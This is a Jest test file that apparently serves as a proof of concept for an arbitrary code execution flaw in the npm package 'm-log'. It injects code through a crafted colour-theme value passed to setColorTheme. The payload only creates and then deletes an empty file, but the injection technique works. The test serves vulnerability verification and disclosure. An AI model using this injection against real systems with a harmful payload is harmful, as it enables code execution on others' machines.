//
test("Arbitrary code execution in m-log", () => {
  const fs = require("fs");
  const log = require("m-log");
  const path = "./m-log";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    log.setColorTheme({
      silly: 'yellow"}); require(`fs`).writeFileSync(`m-log`,``); 23//',
    });
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
